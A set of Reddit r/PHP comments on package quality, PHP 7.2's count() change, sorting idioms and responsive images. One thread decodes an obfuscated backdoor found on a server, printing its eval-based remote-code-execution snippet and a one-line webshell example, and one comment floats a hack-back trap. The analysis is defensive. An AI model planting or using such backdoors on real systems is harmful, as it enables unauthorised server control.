Maybe you're just bad at architecting software. Maybe 100% code coverage and a detailed readme mean fuck all of the code behind it is still garbage and the methods are nonsensical. 1.0 means "these inputs and outputs will work as expected without modification until 2.0". That can start with a single method or 50,000 loc. It has nothing to do with readmes. 
We're talking about packages here. What other tests if not automatic tests are you talking about? There's usually not even a way to open it in your browser and click around. And if we're talking about an implementation the package author uses himself, then why doesn't he just add some tests to the package as well? Usually, it's really not a big deal at all. But yes, I agree with your last statement: Better having no tests than bad tests, because they give false confidence.
Still waiting for the link to your github repo. 
I absolutely agree with you. You make some good points and everyone should read this post and understand it. If they're not on the level yet to understand it fully, they should learn more and harder and become a better developer, instead of just quietly downvoting it.
Why? What's it good for? He's not allowed to write down his opinion and ask for high-quality in open source projects without posting his own Github profile? We should all be open-minded here and the point he's making is definitely valid, no matter if he even released a single package in his life or not. I also was frustrated sometimes by some really low-quality open source projects. And then even if you open a PR, they are sometimes open for many weeks or months. I think we all should aim for better than that.
No where did I say you need 100% code coverage but testing your code should be priority
Exactly. I mean would you write badly untested code and commit that as a change to some ones repo? No you would take the time to write efficiently tested code that is also in some regard documented. So why not do it for your own projects?
More like anther language.
&gt; you don‚Äôt need test coverage but at least a test directory and maybe Travis build status ya know Well that's way worse than having no tests IMHO. If you put an empty test directory (or with tests that were written as an afterthought) it will not make your package better, and just lead others to believe it's actually tested.
True but it does lead, for those who look at the tests to let people know you actually care about the project
Then write me some tests and open a pull/merge request. I put things in GitHub because it's easier than hosting my own highly available distributed source repo. If you find my code and want to use it, lucky you. That license is there for a reason. I'm sharing my work in hopes it helps someone else get work done. I'm not doing it for fame. Judging by your other posts, you seem to be obsessed with followers and stars and how you can get more (on YouTube, Twitch, GitHub...). Maybe spend more time writing tests for people and you'll get a good following. 
The linked tweet was tweeted by [@SaraMG](https://twitter.com/SaraMG) on 2018-03-08 04:07:46 UTC ------------------------------------------------- What'll blow your mind is when you start chaining &amp;lt;=&amp;gt; with ?: to do multi-dim sorts. usort($users, $a, $b ==&amp;gt; $a-&amp;gt;sn &amp;lt;=&amp;gt; $b-&amp;gt;sn ?: $a-&amp;gt;gn &amp;lt;=&amp;gt; $b-&amp;gt;gn); [https://twitter.com/crell/status/971082662004887559](https://twitter.com/crell/status/971082662004887559) ------------------------------------------------- ^‚Ä¢ Beep boop I'm a bot ‚Ä¢ Find out more about me at /r/tweettranscriberbot/ ‚Ä¢
https://secure.php.net/manual/en/language.operators.comparison.php &lt;=&gt; An integer less than, equal to, or greater than zero when $a is respectively less than, equal to, or greater than $b. Available as of PHP 7. Since PHP 5.3, it is possible to leave out the middle part of the ternary operator. Expression expr1 ?: expr3 returns expr1 if expr1 evaluates to TRUE, and expr3 otherwise.
It‚Äôs cute how you use my posts against me too bad it won‚Äôt work. I don‚Äôt care as I have stated about projects that people don‚Äôt release I care about projects people DO release as stable production ready software that arebhalf assed and untested
What the hell is `==&gt;`?
I think this is confusing given the title as the given code is hack and not php.
Also /u/ocramius showed a PHP version: https://twitter.com/Ocramius/status/971644154009849856 https://3v4l.org/aFe5G
Sara answered that question: https://twitter.com/SaraMG/status/971600406211067904
I understand the examples are contrived, but the first one of adjusting some input text in middleware is not a good thing to promote. This type of thing is domain logic and should not be put in middleware (in Laravel at least). Also, being very pedantic; the second example has the expected and actual results the wrong way around in the assertEquals()s.
And the Lord said unto me, "Come forth and receive eternal life". I came fifth and won a toaster.
What good is it? If I'm going to make demands I damn well better be able to show I know what I'm talking about. That means I know what it takes to release software to open source. Sure, all software should be of the highest quality, but let me phrase it this way, what is better? A) Having access to working code that someone is giving you for free, or B) Not having access to that code because somebody (who as far as I can see hasn't contributed anything outside of complaining) has placed arbitrary limits on what is required to release code. Here's the deal, when someone offers you something for free, you either take it and say thank you, or you don't. What you don't do is get on your high horse and rail about how these people that are giving stuff to you for free aren't doing it well enough. So, no, his point isn't valid.
Or you could write readable code. That's also an option.
if you search "count(): Parameter must be an array or an object that implements", you will find so many problems that caused by this change. I know php want more strict type feature. But brean BC is a very very bad idea. why not add a second parameter for count to use strict type? 
Yes, this is a valid concern - while running tests, you're running production code with dev dependencies, risking that the production code uses a dev dependency (e.g. referencing a class that's installed thanks to `require-dev`) which will not be available in production environment. I think that the correct solution for this problem is using [ComposerRequireChecker](https://github.com/maglnet/ComposerRequireChecker) which checks that all used symbols in an application are from `require` section and explicitly mentioned - besides avoiding `require-dev` dependencies, it will also tell you that you're using an indirect dependency...
Maybe that was necessary, I don't know, but the suck thing is the confusion about what should we do about it: Patch the old codebase or force people to upgrade to the latest...
Warnings are not generally considered to be BC breaks.
* with Laravel.
it does. today many frameworks use set_exception_handler to cast warning to Exception and this throw out Exception.
Yeah, but "Fine until you run into an issue" is true for anything, isn't it? :-D
Then you either run in production with "--dev", or you don't test against production code. remember that you dependencies are also code. So installing different dependencies (with --dev) means that you run agains different code. That was sorta the premise of this question :)
Haha true that
Well, the truth is, all those low-quality packages out there actually pollute the ecosystem and doesn't improve it in anyway. Your comment sounds like there is only one package available for one problem / task, but the truth is, often there are dozens available. So all those devs that create another low-quality, untested, unmaintained package out there are basically just wasting everyone's time, because often I have to check 3-4 packages or even more, until I find something usable. And some packages out there are really, really bad. It's similar to Wordpress plugins btw. - those really bad plugins don't improve the Wordpress environment at all. They are responsible for security breaches, etc. Same goes with PHP - even if just a few beginners are using such a bad package, it doesn't do anything good to them nor to PHP. And regarding your last statement - I already said something about PRs in my last comment. Very often, PRs are open for many weeks or even many months - do you seriously think after I submitted a PR that is open for 7 or 8 months, I will ever submit another PR to that project and waste my time? No.
https://www.reddit.com/r/PHP/comments/82vh46/interesting_use_of_the_spaceship_operator/dvd79y2/ should be readable enough
How about improving your code instead of complaining?
I used to use https://github.com/h2non/imaginary for generating sources of srcset, and it was pretty good. Especially if you have CDN in front of imaginary.
I didn't say it was bad. Laravel users will be happy with this announcement. From your article: &gt; We're still working on an official version 7 release, which supports responsive images. You can read more about it here. https://docs.spatie.be/laravel-medialibrary/v7/responsive-images/getting-started-with-responsive-images So I see it's a pretty mature library, tied to Laravel since a long time. I think it's important to know this, because it has an big impact on composer dependencies for non-laravel projects.
Does your production code depends on dev packages? If not, then you test against production code even in --dev. If yes, then the required packages should not be in require-dev.
You're not getting what I'm trying to say: you are correct in those two cases, but lets assume we are in the second case. So we are depending on dev packages. They should be in require-dev, I totally agree, but lets say a temporary lapse in judgement, an overactive IDE, a tired intern and some cosmic rays have all worked together to have it NOT in require dev. As you correctly say, this should not be the case, so you want your automated testing to pick this up. You would pick this up if your testing would run against your actual production code, but as I tried to explain, it won't pick it up as you are testing with this requirement! So while you are correct in you assessment that you have either a wrong dependency or a package installed wronly, but the problem remains that for the most common usecase of installing your automated testing you would NOT find out. And all i'm saying is that that's not good. Not sure what more to add. Ondrej linked the composer require checker, which seems to be made exactly for this usecase, maybe look into that, it might clear something up for you?
Moaaaarrrrr Higher Order Functions would be more maintainable, and readable. This code snipped starts to be hairy as soon as 3rd property is used for sorting. What about 4th, 5th?
Just don't infer CI set up based on composer parameter names.
If you're updating your production PHP version without testing your code on that version first... well, you deserve what you get. And, seriously, which frameworks are casting warnings to exceptions (and why?).
For those interested in an English version: There's a plan to allow the same in userland in [PHP 7.3 with Fibers](https://github.com/fiberphp/fiber-ext).
[Sylius](https://sylius.com/) which is based on Symfony.
&gt; Serious question. I don't know.
Pretty much every issue I've seen was a bug and the change only made it visible.
How exactly did you `count` non-arrays earlier?
Has anyone ever experimented with setting browser dimensions via Ajax on first request and using that in the backend on later requests. Or just sending it on every request if using something like Vue or React. It seems simple enough but I've never seen anyone implement it. 
&gt; What'll blow your mind is when you start chaining &lt;=&gt; with ?: to do multi-dim sorts. &gt; usort($users, $a, $b ==&gt; $a-&gt;sn &lt;=&gt; $b-&gt;sn ?: $a-&gt;gn &lt;=&gt; $b-&gt;gn); What blows my mind is the ability of otherwise smart people to waste their time on irrelevant bullshit. 
I think it's readable if you get used to the idiom with cleaner formatting and more meaningful variables... usort($users, function ($a, $b) { return $a-&gt;username &lt;=&gt; $b-&gt;username ?: $a-&gt;groupname &lt;=&gt; $b-&gt;groupname; });
Just format the code and it's readable, &lt;=&gt; can be read like "compared to": usort($users, function ($a, $b) { return $a-&gt;attack &lt;=&gt; $b-&gt;attack ?: $a-&gt;defense &lt;=&gt; $b-&gt;defense ?: $a-&gt;agility &lt;=&gt; $b-&gt;agility ?: $a-&gt;luck &lt;=&gt; $b-&gt;luck; }); 
Not everyone is fully invested in, or even aware of semver. Some people probably think "well, I have to pick a version, this is the first public release, so I'll pick 1.0"
I bet a lot of projects like that are something people polished and added docs/screenshots/usage examples so they could put it on their resume and job applications, because those often ask for examples of projects and it's always better to show something that looks complete and ready-to-use even if it isn't. But it works for that purpose, because potential employers will be wowed by a nice, well-designed project page or readme even if the code is garbage, but they usually don't care about good code if the presentation is lacking.
&gt; My suggestion was quite simple, but you don't seem to understand. I understood completely what you were saying. &gt; step 1: rename all your counts into NewCount or something again: That's 11K instances of `count()`. While it could possibly be automated, there's still manually checking all of them and to make sure it's actual `count()` usages and not calls to a method called `count()` on some object. &gt; This really doesn't have to take half an hour in total. if you can do this first step in less than half an hour, that's very impressive. &gt; step 2: write that function, and improve the beef you have with count ... which will turn a Zend Engine Opcode into an user mode function call, decreasing the performance of that call by an order of magnitude or two. I don't /think/ we're running `count()` in a hot code path, but still - this is more stuff to check. Also, even if the code path isn't hot, this might still have a measurable performance impact. Given a 300K lines project, this is *not* something I feel I can do in half an hour.
Because you probably want to use my shiny library so much that I HAVE to ship it ASAP.
Why do you have to ship it ASAP? is the question
No. The change only affects code that calls count() on scalar values or non-countable objects. With arrays, you are always safe.
&gt; if you're displaying an image on a mobile device with a screen of 600px wide, there's no need for downloading that image with a width of 1000px. But then what happens when I use pinch to zoom because I want to look at a detail of the picture ?
Wow cool! Thanks for that link. I tried looking for a list of what doesn't implement countable, but couldn't so I figured I'd ask. But that link will definitely come in handy!
It can be useful, it's good to know this kind of module exists. If I can suggest something (if OP is from the dev team), EnqueueManager class could use a factory or something similar to instantiate the default transport class, so you can have one class per transport and put a getConfig() method in each one, rather than have x getXXXmethod in the EnqueueManager ?
I've been a developer for 14 years now, and versioning is one of the best/worst parts of my job. I love seeing the progress. I even enjoy pulling old versions, running and comparing them sometimes; watching the evolution. One major problem is there is no hard standard. The first three jobs I worked at all versioned their software differently. The second company I worked for considered 2.0 a full release, and 1.0 had entered beta. There must be other brands of versioning I've never even seen. 
State mammal ... BEST mammal ... sacred god of orange and white ... semantics.
tldr; "Collector Pattern" is apparently yet another name for the Builder Pattern.
E_DEPRECATED isn't, others are. However PHP gonna PHP, we all know that. They're not following SemVer.
The standard PHP behavior was to return 1 in this case. You might say "well that's dumb", and it is. But changing things like that in a minor release is a generally shitty thing to do.
Already answered in my comment, which may be sarcastic
I‚Äòm not counting uncountable things, so I don‚Äôt have any problems. 
When *you* have a problem with a future breaking update, I'll be sure to come and tell you that *I* don't have a problem, and you better go fix your code.
Can‚Äôt wait to hear from you!
Have you considered finding a different community? Your negativity is annoying. 
Why don't you just do a foreach? It's more readable and clear... 
Which part you find negative in that last comment?
&gt; I know php want more strict type feature. But break BC is a very very bad idea. why not add a second parameter for count to use strict type? PHP doesn't have a consistent culture for handling this. Some will bitch at you for reporting the problem, some will bitch about PHP having the problem. Thanks for reporting it either way. I'm writing this just to give you a quick fix you can apply in a few minutes. Everywhere throughout your codebase, replace instances of "count(" with "count2(". Careful not to replace method calls of the same name or other functions with the same ending etc. If you don't have refactoring in your editor, regex might help by requiring preceding whitespace. Then you need to implement the fix just once: function count2($item) { if ($item instanceof Countable || is_array($item)) return count($item); return 1; } Then once the codebase is stable again, you can slowly go through each instance of `count2()` and see why you're passing scalars etc. to it in some cases and fix the source of the problem.
Countable objects are only the objects that implement the Countable interface. The code below will print all the Countable objects: foreach (get_declared_classes() as $className) { if (is_subclass_of($className, "Countable")) { echo "$className".PHP_EOL; } } Before PHP 7.2, non-contable objects would count as 1, so count(new AnyClassName) === 1. 
Solid point. I do mostly, but I can't remember exactly why I started to use the for loop honestly. I was just concerned with having to go back and fix any old code that did this.
Oh thanks! Okay, that makes sense. So everything I've used count() on should be okay.
I think count change is only to add objects implementing countable. So you don't need to worry, but I will go for foreach in the case of going through an array üëç
If you can figure out how to test my Laravel QuickStart full-LEPP/LEMP stack deployment-in-under-5-minutes project, *please* create an issue! https://github.com/phpexpertsinc/laravel_quickstart
Stalker.
The PHP job market is honestly good in most places. Can be really competitive though. Is it a good idea? That depends on what you are looking for in your career. 2018 is irrelevant it will be no different from last year or next year. Either way you will either need to devote a good chunk of time to learning and producing portfolio pieces before you can get a job unless you join a company that is happy with you picking up BE tasks while working as a FE. In my mind I always think it's a good idea to pick up another language as it helps improve your core understanding and improve your logic building. I'd say go for it just be realistic with the job market. "I've studied PHP for 2 months" Will not cut it these days. Get some good things under your wing to show off. 
Makes you look unprofessional? I'd hardly say so. It's someone in their spare time developing something they think others might use. Testings great but if I'm throwing together something to learn or as quick I'm not going to get bogged down in testing until it's needed. Unless I'm not prototyping and doing the usual bdd
I strongly believe that the containers you develop in should be the ones you deploy on. I would not deploy on this. 
&gt; It's really fascinating to watch just how many down votes this and EVERY COMMENT I placed, got. It baffles me that we can't have both open and "free" software without also having quality written software. You're not being downvoted for your opinion. You are being downvoted for the *way* you are expressing your opinion. You could have made a post detailing the reasons why people should do more testing without being insulting.
I have an *open_basedir* restriction inside my *php.ini* and want to temporarily overwrite it for *phpcs* and *phpunit* in the build process, but nothing works. + vendor/bin/phpunit -d open_basedir=/ Warning: file_exists(): open_basedir restriction in effect. File(/var/jenkins_home/...) is not within the allowed path(s): (/var/app/) Setting it via *phpunit.xml* doesn't work either. Does anyone have experience with this? üòï
I wouldn't assume you would do something equivelant to the srcset that would always assume about 4 different sizes. I'm on mobile so formatting may not work that well and I'll use bootstraps class names for simplicity but something like this could work surely? srcset('avatar_xs.png', 'avatar_sm.png', 'avatar_md.png', 'avatar_lg.png'); function srcset($xs, $sm, $md, $lg) { if(session('width') &gt; 1200 &amp;&amp; $lg) return $lg; if(session('width') &gt; 992 &amp;&amp; $md) return $md; if(session('width') &gt; 768 &amp;&amp; $sm) return $sm; return $xs } That way you could define multiple image sizes depending on browser width, but if you could just define $xs and $lg for example and make the other two null. And if you were using something like bootstrap it would use the same logic that you were already using. 
Is it just me, or is there a recent spate of people saying "Here, deploy my collection of images which are slightly customized compared to the more-official ones"?
strange just variables? i winderif it reassembles them to make some sense. 
All other directories had files like that. And .htaccess linked to one
Looks like obfuscated bad stuff. Can't say what exactly, but notice something when running: [it attempts to call `create_function`](https://3v4l.org/8lUWZ) Sure enough if you check out line 36 it's using function-call syntax and using the fact that in php $x = 'var_dump'; $x(10); calls the `var_dump` function. Obscuring what you're trying to do with string-mangling like this, using ridiculous encoding schemes and all sorts of weird behaviour to try and get around people knowing what you've done isn't that rare. (In fact you can find tools to obfuscate things like this out there for you.) You should assume this is malicious without proof otherwise, assume the servers are compromised without proof otherwise (if this was an initial entrypoint there's no telling, without a detailed security audit, how far past this the attacker may have gotten and if there are other backdoors in harder to find places) and you should do a security audit to figured out how those got there to the best of your ability.
Wow thats super interesting!
I stared at this for 10 minutes and got very little. Nice analysis with good advice.
Ikr, I probably deleted a few megabytes of these from the webroot. There were at least 5 per folder
I don't see what additional benefit this theme would provide over directly injecting `\DateTimeImmutable`.
Typical php shell stuff. Whole server is suspect now. Let me guess... they use Wordpress.
looks like obfuscated base64 strings, other files might be calling it, google php reverse shells, they are a thing and people can do all kind of nasty stuff in your servers if they get a file like that in it. imagine if someone snuck this file in your server... &lt;?php echo exec($_GET['command']);
It ends up eval'ing this: $i = array_merge($_REQUEST,$_COOKIE,$_SERVER); $a = isset($i["cbbbcptx"]) ? $i["cbbbcptx"] : (isset($i["HTTP_CBBBCPTX"]) ? $i["HTTP_CBBBCPTX"] : die); eval(strrev(base64_decode(strrev($a)))); Basically, someone can execute any code in the server, passing it in the "cbbbcptx" parameter.
HOLY SH!T that‚Äôs bad. Thank you for alerting me to what it did 
Php is always a plus. Most servers have it as a default and it‚Äôs free which makes it a go to for any company. Not to mention so many other ‚Äúlanguages‚Äù / frameworks are all built on top of it. I personally recommend learning it to anyone looking to get into backend development. Python, ruby, rails, laravel are all wrappers for php. If you understand it first, then the learning curve for these others will be drastically reduced, thus increasing your marketability in the future.
I did the following: 1. Use https://github.com/nikic/PHP-Parser to pretty-print the file. 2. Look out for `(`, `,` - basically characters that are used when a function is called. 3. Isolate the string concatenations 4. Dump the strings. 5. Manually pretty-print the most interesting string. The result is this PHP code that is going to be executed: $i = array_merge($_REQUEST, $_COOKIE, $_SERVER); $a = isset($i["cbbbcptx"]) ? $i["cbbbcptx"] : ( isset($i["HTTP_CBBBCPTX"]) ? $i["HTTP_CBBBCPTX"] : die ); eval(strrev(base64_decode(strrev($a)))); Yeah, it's remote code execution over HTTP.
&gt; If our tests starts to run at `2022-01-01 23:59:59.999999` and the next line we set the expected date to `now + 14 days` we have a problem. The start time and expected time are not what we expect, they'll actually be 15 days apart. This is because "we" are not paying attention, because the following is the snippet in question: $expirationDate = (new DateTimeImmutable()) -&gt;modify('+14 days') -&gt;setTime(0, 0, 0); So "we're" creating an object, throwing it away, then creating another object and proceeding to complain that its state is inconsistent with the object that was thrown away. Are two date/time objects the same if they were created at different times? Probably not! It sounds simple when you put it like that, but date/time logic *will* bite you in the ass if you don't know what you're doing. Using date and time logic is not easy.
It's a godaddy linux host (Not my choice, clients choice....) also it is just a simple shtml site that is like 10 years old xD they were sending me in to revamp it. So I assuming I should just contact godaddy about this.
After reading Phil Sturgeon's book "Designing API's That Don't Suck" I've adopted the philosophy of always working in UNIX timestamps until I'm given a really compelling case not to. Which is generally not until the moment they need to be displayed. I work pretty equal time in PHP, C#, and JavaScript, and none of these languages Date or DateTime abstractions leave me with anything but confusion about the precision I can depend on out of the object or the timezone from which the actual point in time it references is offset.
did it actually use those other variables orwere they just to hide the real stuff?
Maybe try to sell api first development? One api, then a web ui and phone ui's can go on top of it. Also can lead to saas
If you have root privileges on the server, you can get a php malware scanner at www.monarx.com It is in early beta but it will give you a report of potentially malicious code on the server. In the future it will have permission issues and a paid version that prevents the code from execution. 
Man i haven't heard of cake in a while! I remember when it was just cake or codeigniter
I understand where the contempt is coming from, but the wodby guys are legit, and have been making good images for a while now.
Some were not used at all (like $hardships), and some were used without declaring (like $britteny), but most were used to extract parts and form an intelligible string. $bodybuild is the string "create_function", and you can see at the end of line 31 to build in $contravention a function that will eval the string you pass to it. If you do a search for ";", lots of hits on the first half, but none on the second half: that's where $contravention is called, and as an argument it gets lots of concatenations from sections of the other strings, building what I said above.
Nothing I‚Äôve said is ‚Äúinsulting‚Äù you‚Äôre just taking it that way because the truth hurts 
Yes, it is. You not realizing it doesn't make it not true.
How did you figure this out?
this is incredible. i am impressed with the level of obfuscation and complexity.
I mean, it's a lot of overhead, and doesn't take screen density in account. Responsive images were designed to take away all this micro management for developers, and still serve an almost perfect image for your screen. In theory your approach is better, but I don't really see it work in practice. There are libraries out there that do this btw, so you could play around with it and maybe prove me wrong üòä
Overhead in terms of developer time or system resources? Your proposal looks like it would be more overhead system resources wise.
What this guys says ^ If you're looking at a map of Mars posted be NASA, you'll want a very detailed image. If you're speaking about the normal hero and thumbnail images that exist on almost every content site, the "user will zoom in" scenario can be ignored. The responsive images spec is designed to work with what the browser knows about its current screen size, so I can image a user with eg. a screen always set to 150% because of accessibility would be served a better image. Haven't tested it though!
Or change it, so that passing anything to the cbbbcptx parameter logs the attempt (what they passed, when, IP and so on), then, instead of executing, send something back which does something nasty at the client computer (I think this is the only time I feel sad that you can't do much with the client in PHP...). Trap the culprit.
Even better - use https://mailtrap.io Mailtrap is a free service that you can just login to and see the emails your app would have actually sent out. It traps the mail in its service. Really nice during development, saves money/time. Supports SMTP and has an HTTP API too.
I don‚Äôt believe you. 
Would it? You would generate an indefinte amount of variations of the same image, one for every user with a unique screen dimension. I would generate a fixed amount, but dynamicay scaled so there‚Äôs an evenly distributed margin between the filesize of each variation.
Hopefully, you do not write your own crypto as a part of that project... ;P Yes. You can. Use mail catching software, then go to fake mailbox provided by it, and click on links or copy codes. You *should* write your links in a way, that make them independent of domain. On local host it should generate links relative to it. On test environment relative to test. Production would have production links. If you don't have that yet, you still can manually edit links replacing production domain with localhost:whatever_custom_port.
Totally agree. Using date and time logic is harder than lead to believe. A lot harder than I thought it was when I was a less experienced developer. The example was meant to illustrate a "less than ideal" situation, which you point out it is. That's also the point, otherwise, why change it? Right?
When injecting a `DateTimImmutable` the time is fixed from that point. If you need time for logging/metrics or from a more precise point you need to "sample" time at a specific point. That's when you can no longer inject it and need something like a clock (or an instantiation of a DTI class).
It doesn't seem to offer much, limited authentication and so on and GPL makes it hard to use in some projects. Where do you see the advantages?
Good point. Still, even if the server is wiped, it would be fun to leave a trap... 
You mean generators, but fibers won't have that problem. And they're not that difficult to use, it's the same in JavaScript with `async` / `await`.
If there are now rows, it'll return an empty array. `false` is only returned in case of a failure. If you want to explicitly ignore the failure, you can write `$rows = $std-&gt;fetchAll() ?: [];`
Same here. From what I can remember, I never have either.
Jesus christ man..... Ok, first of all. Why are you attempting to fetch rows before you know there are any? Secondly, in almost all circumstances you want to wrap fetchAll() with your own implementation so that it consistently returns an array or null. The API allows for too many different outcomes. Lastly, you're using the API wrong, seriously. If you want to work with the vanilla API you need to work with `$rows-&gt;rowCount()`, which counts the results for you. This is a very simple example on how the general go-about looks like; &lt;?php $pdo = new \PDO("", "", ""); $stmt = $pdo-&gt;prepare(""); $stmt-&gt;bindValue("", ""); if (!$stmt-&gt;execute()) { // Error } if ($stmt-&gt;rowCount() === 0) { // No rows } foreach ($stmt-&gt;fetchAll(\PDO::FETCH_ASSOC) as $row) { // Do something } 
not if it's a VPS style server 
&gt; It's not dumb, it was in that case you using the results in a wrong way, attempting to do something that wasn't meant to do that thing. Two corrections: 1. I haven't used count() this way, so you're directing your boilerplate critique to the wrong person. 2. Actually `count()` was very much **meant** to "do that thing". It was the official behavior of PHP before 7.2. Here's the manual: &gt; When the parameter is neither an array nor an object with implemented Countable interface, 1 will be returned. There is one exception, if array_or_countable is NULL, 0 will be returned. See, that's a declaration of what was "meant" right there in the manual.
I'm not sure you read my comment properly at most it would generate 4 images and sometimes just 2. Where did you get indefinite from?
Comment from OP further up said it was a basic shtml-site from 10-years ago. WordPress isn‚Äôt inherently insecure, it‚Äôs just that it powers 30% of all websites and is by far the most popular CMS. Usually security holes in WordPress requires several conditions to be true, certain version of a plug-in on a certain version of WordPress, a particular type of serversetup or outdated software on the server mixed in. And of course some plugins are just poorly written.
Good point! I could see a use case now: When I have objects that represent something `Cacheable`, such as rendered HTML templates, and I would want to define caching rules such as a TTL like: * "until midnight" * "until midnight in 7 days" Those could become methods in the `Clock` and abstract away the method calls on `DateTimeImmutable` or whatever datetime type.
&gt; Has anyone ever experimented with setting browser dimensions via Ajax on first request and using that in the backend on later requests. Sorry, I interpreted this as "generating an image for the screen dimensions of that user". If you're just talking about loading one of four images based on the dimensions of a screen: you don't need AJAX for that, it's exactly what responsive image spec solves.
So than, coming back to the question of system resources: yes you need more disk space if you're generating more variations of the same image. And I believe that's a good thing: - Storage is cheap - The server is the layer you control, as opposed to the bandwidth of the client. So I prefer to optimise for the client, even if that means I'll have to spend a few more dollars on hosting. It's of course dependant on what kind of projects you're doing and your available resources.
No, just focus on what's important. 